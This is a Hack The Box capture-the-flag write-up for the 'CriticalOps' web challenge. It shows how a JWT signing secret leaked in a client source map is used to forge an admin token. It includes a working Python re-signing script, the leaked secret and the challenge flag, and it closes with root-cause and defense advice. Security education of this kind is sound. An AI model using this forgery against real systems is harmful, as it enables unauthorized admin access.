---
title: "CriticalOps"
description: "Forging an HS256 JWT to change the role and access administrative functionality."
platform: "Hack The Box"
category: "Web"
difficulty: "Medium"
publishedAt: 2026-08-08
tags: ["web", "jwt", "hs256", "source-map", "authentication", "authorization"]
language: "en"
translationKey: "hack-the-box/critical-ops"
draft: false
featured: false
cover: "/images/critical-ops/critical-ops-05.png"
---

> This write-up was conducted in a controlled lab environment. Only apply the techniques below on systems you are authorized to test.

## Overview

CriticalOps is an incident-management dashboard with an **Admin Panel**. The application stores a JWT on the client and uses the `role` claim to decide access. The objective is to turn a normal account into an admin by creating a valid replacement token.

The flaw is that the JWT secret is present in the client bundle/source map. Because the token uses HS256, the leaked secret is enough to sign the token again after changing its payload.

## JWT Analysis

A JWT has three dot-separated parts:

```text
Header.Payload.Signature
```

- `Header` contains the token type and signing algorithm, here `HS256`.
- `Payload` contains claims such as `userId`, `username`, `role`, `iat`, and `exp`.
- `Signature` lets the server verify whether the token was modified.

The header and payload are Base64URL-encoded, not encrypted, so they can be read. However, changing the payload without generating a new signature makes the token invalid.

## Solution

### 1. Find the authentication token

After logging in, open DevTools and inspect cookies or local storage. The application stores the token under the `authToken` key. Copy it for local analysis; do not send the real token to a third-party service.

![JWT authToken in the browser cookie](https://tameruict.github.io/images/critical-ops/critical-ops-06.png)

![JWT authToken in local storage](https://tameruict.github.io/images/critical-ops/critical-ops-07.png)

### 2. Read the source map for the secret

In the **Sources** tab, search for `JWT_SECRET`. The source map points to `jwt.ts`, where the secret is hard-coded:

![DevTools showing authToken and the JWT_SECRET search result](https://tameruict.github.io/images/critical-ops/critical-ops-01.png)

```javascript
const JWT_SECRET = 'SecretKey-CriticalOps-2025';
```

![JWT secret exposed in the source map](https://tameruict.github.io/images/critical-ops/critical-ops-02.png)

This is a serious design issue: a signing secret must remain on the server and must never be bundled into JavaScript sent to the client.

### 3. Preserve claims and change the role

Decode the current token, keep the identity and expiry claims, and change `role` to `admin`. The following script signs the token again with HMAC-SHA256:

![Decoded JWT showing the admin role and related claims](https://tameruict.github.io/images/critical-ops/critical-ops-03.png)

```python
import base64
import hashlib
import hmac
import json

token = "PASTE_AUTH_TOKEN_HERE"
secret = b"SecretKey-CriticalOps-2025"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header_b64, payload_b64, _ = token.split(".")
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
payload["role"] = "admin"

new_payload_b64 = b64url(json.dumps(
    payload, separators=(",", ":")
).encode())
signing_input = header_b64.encode() + b"." + new_payload_b64
signature = b64url(hmac.new(
    secret, signing_input, hashlib.sha256
).digest())

forged_token = signing_input.decode() + "." + signature.decode()
print(forged_token)
```

Replace `authToken` with the new token and reload the dashboard. The server accepts `role=admin` because the replacement signature is valid, and the Admin Panel becomes available.

![JWT signature regenerated with the challenge secret](https://tameruict.github.io/images/critical-ops/critical-ops-04.png)

### 4. Retrieve the flag

The Admin Panel incident list contains a record whose title is the flag:

```text
HTB{Wh0_Put_JWT_1n_Cl13nt_S1d3_Im4g}
```

![Flag displayed in the Admin Panel incident list](https://tameruict.github.io/images/critical-ops/critical-ops-05.png)

## Root Cause

Two issues work together:

1. The HS256 secret is shipped to the client through the bundle/source map.
2. The server trusts the `role` claim in the token without an additional authorization check when the secret is compromised.

JWTs do not encrypt their payload. Therefore, Base64URL encoding is not a security control and cannot hide roles or secrets.

## Defense

- Sign and verify JWTs only on the server; never place `JWT_SECRET` in the client bundle, source map, or any frontend-exposed environment variable.
- Use a long, random secret stored in a secret manager, and rotate it after any suspected exposure.
- Allowlist the expected algorithm (`HS256` or the selected alternative) and reject unexpected `alg` values.
- Do not use a client-controlled claim as the only authorization source. For sensitive actions, check the role through a server-side session or database.
- Use short expirations, token revocation/rotation, and cookies protected with appropriate `HttpOnly`, `Secure`, and `SameSite` settings.
- Disable production source maps or ensure they contain no secrets or other sensitive information.

## Lessons Learned

When a JWT is present on the client, distinguish decoding a payload from producing a valid token. With HS256, a leaked secret makes every claim forgeable; inspecting the bundle and source map is often the decisive step.
